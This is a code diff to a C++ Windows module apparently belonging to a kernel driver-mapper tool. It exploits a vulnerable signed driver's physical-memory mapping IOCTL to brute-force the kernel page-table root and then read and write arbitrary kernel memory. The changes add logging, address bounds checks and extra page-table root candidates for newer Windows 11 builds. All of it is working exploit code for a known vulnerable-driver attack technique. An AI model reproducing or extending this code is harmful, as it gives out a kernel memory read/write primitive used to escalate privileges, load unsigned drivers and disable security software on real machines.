@@ -9,10 +9,30 @@
 #include <wincrypt.h>
 #include <mscat.h>
 #include <string>
+#include <cstdarg>
 
 #pragma comment(lib, "setupapi.lib")
 #pragma comment(lib, "wintrust.lib")
 #pragma comment(lib, "crypt32.lib")
+
+// Forward declare from MapperCore.cpp
+extern FILE* g_LogFile;
+static void VDbgLog(const char* func, const char* fmt, ...) {
+    char buf[2048];
+    va_list args;
+    va_start(args, fmt);
+    int prefixLen = snprintf(buf, sizeof(buf), "[VulnDriver][%s] ", func);
+    if (prefixLen < 0) prefixLen = 0;
+    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
+    va_end(args);
+    printf("%s\n", buf);
+    fflush(stdout);
+    OutputDebugStringA(buf);
+    OutputDebugStringA("\n");
+    if (g_LogFile) { fprintf(g_LogFile, "%s\n", buf); fflush(g_LogFile); }
+}
+#define VLOG(fmt, ...) VDbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
+#define VLOG_STATUS(msg, st) VDbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")
 
 DEFINE_GUID(GUID_DEVINTERFACE_GIO,
     0x70a35746, 0x5d4c, 0x4d58, 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e);
@@ -21,6 +41,8 @@ DEFINE_GUID(GUID_DEVINTERFACE_GIO_ALT,
     0x4d36e97d, 0xe325, 0x11ce, 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18);
 
 namespace VulnDriver {
+
+    static ULONGLONG g_MaxPhysAddr = 0;
 
     static const wchar_t* DeviceNames[] = {
         L"\\??\\GLCKIo",
@@ -142,6 +164,7 @@ namespace VulnDriver {
     }
 
     NTSTATUS OpenDevice(PHANDLE deviceHandle) {
+        VLOG("=== OpenDevice ===");
         if (!deviceHandle) {
             return STATUS_INVALID_PARAMETER;
         }
@@ -149,16 +172,20 @@ namespace VulnDriver {
         *deviceHandle = nullptr;
 
         if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO, deviceHandle)) {
+            VLOG("Opened via GUID_DEVINTERFACE_GIO, handle=%p", *deviceHandle);
             return STATUS_SUCCESS;
         }
 
         if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO_ALT, deviceHandle)) {
+            VLOG("Opened via GUID_DEVINTERFACE_GIO_ALT, handle=%p", *deviceHandle);
             return STATUS_SUCCESS;
         }
 
         if (TryOpenViaCfgMgr(deviceHandle)) {
+            VLOG("Opened via CfgMgr, handle=%p", *deviceHandle);
             return STATUS_SUCCESS;
         }
+        VLOG("Interface/CfgMgr methods failed, trying direct device names...");
 
         NTSTATUS lastStatus = STATUS_OBJECT_NAME_NOT_FOUND;
 
@@ -189,12 +216,15 @@ namespace VulnDriver {
             );
 
             lastStatus = status;
+            VLOG("  NtCreateFile '%ls': 0x%08X", DeviceNames[i], (DWORD)status);
 
             if (NT_SUCCESS(status)) {
+                VLOG("  Opened via '%ls', handle=%p", DeviceNames[i], *deviceHandle);
                 return status;
             }
         }
 
+        VLOG("OpenDevice FAILED, lastStatus=0x%08X", (DWORD)lastStatus);
         return lastStatus;
     }
 
@@ -241,6 +271,11 @@ namespace VulnDriver {
             return STATUS_INVALID_PARAMETER;
         }
 
+        // Safety: reject physical addresses outside known RAM range
+        if (g_MaxPhysAddr != 0 && physAddr >= g_MaxPhysAddr) {
+            return STATUS_INVALID_PARAMETER;
+        }
+
         WINIO_PHYS_MEM ioData = { 0 };
         ioData.Size.QuadPart = static_cast<LONGLONG>(size);
         ioData.PhysicalAddress.QuadPart = static_cast<LONGLONG>(physAddr);
@@ -268,7 +303,12 @@ namespace VulnDriver {
             CacheMapResult(ioData);
         } else {
             if (NT_SUCCESS(status)) {
+                VLOG("MapPhysicalMemory: IOCTL succeeded but MappedAddress is NULL! phys=0x%llX size=0x%X",
+                     physAddr, size);
                 status = STATUS_UNSUCCESSFUL;
+            } else {
+                VLOG("MapPhysicalMemory FAILED: phys=0x%llX size=0x%X status=0x%08X",
+                     physAddr, size, (DWORD)status);
             }
         }
 
@@ -328,6 +368,8 @@ namespace VulnDriver {
 
         NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
         if (!NT_SUCCESS(status)) {
+            VLOG("ReadPhysicalMemory: MapPhysicalMemory failed for phys=0x%llX, status=0x%08X",
+                 physAddr, (DWORD)status);
             return status;
         }
 
@@ -355,6 +397,8 @@ namespace VulnDriver {
 
         NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
         if (!NT_SUCCESS(status)) {
+            VLOG("WritePhysicalMemory: MapPhysicalMemory failed for phys=0x%llX, status=0x%08X",
+                 physAddr, (DWORD)status);
             return status;
         }
 
@@ -375,6 +419,28 @@ namespace VulnDriver {
     static ULONGLONG g_KernelCR3 = 0;
     static ULONGLONG g_NtoskrnlBase = 0;
 
+    static ULONGLONG GetMaxPhysicalAddress() {
+        if (g_MaxPhysAddr != 0) return g_MaxPhysAddr;
+        MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
+        if (GlobalMemoryStatusEx(&memStatus)) {
+            // Use 2x total physical RAM as upper bound (accounts for MMIO gaps)
+            g_MaxPhysAddr = memStatus.ullTotalPhys * 2;
+            if (g_MaxPhysAddr < 0x100000000ULL) g_MaxPhysAddr = 0x100000000ULL; // 4GB minimum
+        } else {
+            g_MaxPhysAddr = 0x200000000ULL; // 8GB fallback
+        }
+        VLOG("Max physical address set to 0x%llX (%.1f GB)", g_MaxPhysAddr, (double)g_MaxPhysAddr / (1024.0*1024.0*1024.0));
+        return g_MaxPhysAddr;
+    }
+
+    static BOOL IsPhysAddrSafe(ULONGLONG physAddr) {
+        ULONGLONG maxPhys = GetMaxPhysicalAddress();
+        if (physAddr >= maxPhys) return FALSE;
+        // Reject page 0 (null page) and very low addresses (< 4KB)
+        if (physAddr < 0x1000) return FALSE;
+        return TRUE;
+    }
+
     static ULONGLONG VirtualToPhysicalWithCR3(HANDLE device, ULONGLONG cr3, ULONGLONG va) {
         ULONGLONG pml4Index = (va >> 39) & 0x1FF;
         ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
@@ -391,6 +457,8 @@ namespace VulnDriver {
         }
 
         ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
+        if (!IsPhysAddrSafe(pdptPhys)) return 0;
+
         ULONGLONG pdpte = 0;
         if (!NT_SUCCESS(ReadPhysicalMemory(device, pdptPhys + pdptIndex * 8, &pdpte, sizeof(pdpte)))) {
             return 0;
@@ -399,10 +467,13 @@ namespace VulnDriver {
             return 0;
         }
         if (pdpte & 0x80) {
-            return (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
+            ULONGLONG result = (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
+            return IsPhysAddrSafe(result) ? result : 0;
         }
 
         ULONGLONG pdPhys = pdpte & 0xFFFFFFFFF000ULL;
+        if (!IsPhysAddrSafe(pdPhys)) return 0;
+
         ULONGLONG pde = 0;
         if (!NT_SUCCESS(ReadPhysicalMemory(device, pdPhys + pdIndex * 8, &pde, sizeof(pde)))) {
             return 0;
@@ -411,10 +482,13 @@ namespace VulnDriver {
             return 0;
         }
         if (pde & 0x80) {
-            return (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
+            ULONGLONG result = (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
+            return IsPhysAddrSafe(result) ? result : 0;
         }
 
         ULONGLONG ptPhys = pde & 0xFFFFFFFFF000ULL;
+        if (!IsPhysAddrSafe(ptPhys)) return 0;
+
         ULONGLONG pte = 0;
         if (!NT_SUCCESS(ReadPhysicalMemory(device, ptPhys + ptIndex * 8, &pte, sizeof(pte)))) {
             return 0;
@@ -423,7 +497,8 @@ namespace VulnDriver {
             return 0;
         }
 
-        return (pte & 0xFFFFFFFFF000ULL) + pageOffset;
+        ULONGLONG result = (pte & 0xFFFFFFFFF000ULL) + pageOffset;
+        return IsPhysAddrSafe(result) ? result : 0;
     }
 
     static BOOL VerifyCR3Candidate(HANDLE device, ULONGLONG cr3Candidate, ULONGLONG ntoskrnlVA) {
@@ -449,21 +524,39 @@ namespace VulnDriver {
     }
 
     static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
+        VLOG("=== GetKernelCR3FromEPROCESS ===");
         PVOID pPsInitialSystemProcess = KernelUtils::GetKernelProcAddress(
             (PVOID)ntoskrnlBase, "PsInitialSystemProcess");
 
         if (!pPsInitialSystemProcess) {
+            VLOG("ERROR: PsInitialSystemProcess not found!");
             return 0;
         }
+        VLOG("PsInitialSystemProcess kernel addr: %p", pPsInitialSystemProcess);
 
+        // Initialize max physical address for bounds checking
+        GetMaxPhysicalAddress();
+
+        // Extended candidate list: common CR3 locations on Win10 AND Win11 24H2/25H2
         static const ULONGLONG lowCR3Candidates[] = {
+            // Win10 common
             0x1AD000, 0x1AB000, 0x1A9000, 0x1A7000,
             0x1B0000, 0x1B2000, 0x1B4000, 0x1B6000,
             0x100000, 0x102000, 0x104000, 0x106000,
             0x180000, 0x182000, 0x184000, 0x186000,
             0x200000, 0x202000, 0x204000, 0x206000,
-            0x300000, 0x400000, 0x500000, 0x600000
+            0x300000, 0x400000, 0x500000, 0x600000,
+            // Win11 24H2/25H2 tend to use higher addresses
+            0x800000, 0x900000, 0xA00000, 0xB00000,
+            0xC00000, 0xD00000, 0xE00000, 0xF00000,
+            0x1000000, 0x1100000, 0x1200000, 0x1400000,
+            0x1600000, 0x1800000, 0x1A00000, 0x1C00000,
+            0x2000000, 0x2200000, 0x2400000, 0x2800000,
+            0x3000000, 0x4000000, 0x5000000, 0x6000000,
+            0x7000000, 0x8000000, 0x9000000, 0xA000000,
         };
+
+        VLOG("Trying %zu fast CR3 candidates...", sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]));
 
         for (int i = 0; i < sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]); i++) {
             ULONGLONG testCR3 = lowCR3Candidates[i];
@@ -499,15 +592,34 @@ namespace VulnDriver {
             }
 
             if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
+                VLOG("Found kernel CR3 via EPROCESS: 0x%llX (from candidate 0x%llX)",
+                     dtb, lowCR3Candidates[i]);
                 return dtb;
             }
         }
 
-        for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x10000000; testCR3 += 0x1000) {
-            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
-            if (physPsInit == 0) {
+        VLOG("Fast CR3 candidates exhausted, scanning 0x100000-0x20000000...");
+        int consecutiveFailures = 0;
+        const int MAX_CONSECUTIVE_FAILURES = 256; // abort if too many consecutive map failures
+
+        for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x20000000; testCR3 += 0x1000) {
+            // Safety: skip the first read itself to check if this physical page is mappable
+            if (!IsPhysAddrSafe(testCR3)) {
                 continue;
             }
+
+            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
+            if (physPsInit == 0) {
+                consecutiveFailures++;
+                if (consecutiveFailures > MAX_CONSECUTIVE_FAILURES) {
+                    VLOG("WARNING: %d consecutive failures at testCR3=0x%llX, skipping ahead...",
+                         consecutiveFailures, testCR3);
+                    testCR3 += 0x100000 - 0x1000; // skip 1MB ahead
+                    consecutiveFailures = 0;
+                }
+                continue;
+            }
+            consecutiveFailures = 0;
 
             ULONGLONG systemEprocess = 0;
             if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
@@ -535,90 +647,51 @@ namespace VulnDriver {
             }
 
             if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
+                VLOG("Found kernel CR3 via brute-force: 0x%llX (from scan testCR3=0x%llX)",
+                     dtb, testCR3);
                 return dtb;
             }
         }
 
+        VLOG("FATAL: Could not find kernel CR3!");
         return 0;
     }
 
     static ULONGLONG FindKernelCR3(HANDLE device, ULONGLONG ntoskrnlBase) {
+        VLOG("FindKernelCR3: ntoskrnlBase=0x%llX", ntoskrnlBase);
         ULONGLONG cr3 = GetKernelCR3FromEPROCESS(device, ntoskrnlBase);
         if (cr3 != 0) {
+            VLOG("Kernel CR3 = 0x%llX", cr3);
             return cr3;
         }
 
+        VLOG("FATAL: FindKernelCR3 failed!");
         return 0;
     }
 
     ULONGLONG VirtualToPhysical(HANDLE device, PVOID virtualAddress) {
         ULONGLONG va = (ULONGLONG)virtualAddress;
 
-        ULONGLONG pml4Index = (va >> 39) & 0x1FF;
-        ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
-        ULONGLONG pdIndex = (va >> 21) & 0x1FF;
-        ULONGLONG ptIndex = (va >> 12) & 0x1FF;
-        ULONGLONG pageOffset = va & 0xFFF;
-
         if (g_KernelCR3 == 0) {
+            VLOG("CR3 cache empty, resolving...");
             if (g_NtoskrnlBase == 0) {
                 g_NtoskrnlBase = (ULONGLONG)KernelUtils::GetKernelModuleBase("ntoskrnl.exe");
+                VLOG("ntoskrnl base = 0x%llX", g_NtoskrnlBase);
             }
             g_KernelCR3 = FindKernelCR3(device, g_NtoskrnlBase);
             if (g_KernelCR3 == 0) {
+                VLOG("ERROR: VirtualToPhysical - CR3 resolution failed for VA=%p", virtualAddress);
                 return 0;
             }
+            VLOG("CR3 cached: 0x%llX", g_KernelCR3);
         }
 
-        ULONGLONG pml4e = 0;
-        if (!NT_SUCCESS(ReadPhysicalMemory(device, g_KernelCR3 + pml4Index * 8, &pml4e, sizeof(pml4e)))) {
-            return 0;
-        }
-        if (!(pml4e & 1)) {
-            return 0;
-        }
-
-        ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
-        ULONGLONG pdpte = 0;
-        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdptPhys + pdptIndex * 8, &pdpte, sizeof(pdpte)))) {
-            return 0;
-        }
-        if (!(pdpte & 1)) {
-            return 0;
-        }
-        if (pdpte & 0x80) {
-            ULONGLONG result = (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
-            return result;
-        }
-
-        ULONGLONG pdPhys = pdpte & 0xFFFFFFFFF000ULL;
-        ULONGLONG pde = 0;
-        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdPhys + pdIndex * 8, &pde, sizeof(pde)))) {
-            return 0;
-        }
-        if (!(pde & 1)) {
-            return 0;
-        }
-        if (pde & 0x80) {
-            ULONGLONG result = (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
-            return result;
-        }
-
-        ULONGLONG ptPhys = pde & 0xFFFFFFFFF000ULL;
-        ULONGLONG pte = 0;
-        if (!NT_SUCCESS(ReadPhysicalMemory(device, ptPhys + ptIndex * 8, &pte, sizeof(pte)))) {
-            return 0;
-        }
-        if (!(pte & 1)) {
-            return 0;
-        }
-
-        ULONGLONG result = (pte & 0xFFFFFFFFF000ULL) + pageOffset;
-        return result;
+        return VirtualToPhysicalWithCR3(device, g_KernelCR3, va);
     }
 
     NTSTATUS ReadKernelMemory(HANDLE device, PVOID address, PVOID buffer, SIZE_T size) {
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
+            VLOG("ReadKernelMemory: INVALID DEVICE HANDLE");
             return STATUS_INVALID_HANDLE;
         }
         if (!buffer || size == 0) {
@@ -635,11 +708,14 @@ namespace VulnDriver {
 
             ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
             if (physAddr == 0) {
+                VLOG("ReadKernelMemory: VA->PA translation failed for VA=0x%llX", va);
                 return STATUS_UNSUCCESSFUL;
             }
 
             NTSTATUS status = ReadPhysicalMemory(device, physAddr, outBuf, chunkSize);
             if (!NT_SUCCESS(status)) {
+                VLOG("ReadKernelMemory: ReadPhysicalMemory failed, VA=0x%llX PA=0x%llX status=0x%08X",
+                     va, physAddr, (DWORD)status);
                 return status;
             }
 
@@ -653,6 +729,7 @@ namespace VulnDriver {
 
     NTSTATUS WriteKernelMemory(HANDLE device, PVOID address, PVOID data, SIZE_T size) {
         if (device == nullptr || device == INVALID_HANDLE_VALUE) {
+            VLOG("WriteKernelMemory: INVALID DEVICE HANDLE");
             return STATUS_INVALID_HANDLE;
         }
         if (!data || size == 0) {
@@ -669,11 +746,14 @@ namespace VulnDriver {
 
             ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
             if (physAddr == 0) {
+                VLOG("WriteKernelMemory: VA->PA translation failed for VA=0x%llX", va);
                 return STATUS_UNSUCCESSFUL;
             }
 
             NTSTATUS status = WritePhysicalMemory(device, physAddr, inBuf, chunkSize);
             if (!NT_SUCCESS(status)) {
+                VLOG("WriteKernelMemory: WritePhysicalMemory failed, VA=0x%llX PA=0x%llX status=0x%08X",
+                     va, physAddr, (DWORD)status);
                 return status;
             }
 
